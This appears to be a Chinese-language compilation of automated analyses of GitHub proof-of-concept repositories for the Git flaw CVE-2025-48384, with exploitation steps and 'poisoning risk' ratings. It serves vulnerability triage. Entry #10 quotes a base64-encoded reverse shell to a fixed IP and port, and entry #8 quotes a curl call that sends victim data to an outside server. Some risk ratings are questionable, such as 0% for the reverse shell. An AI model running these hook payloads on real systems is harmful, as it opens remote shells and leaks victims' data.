代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

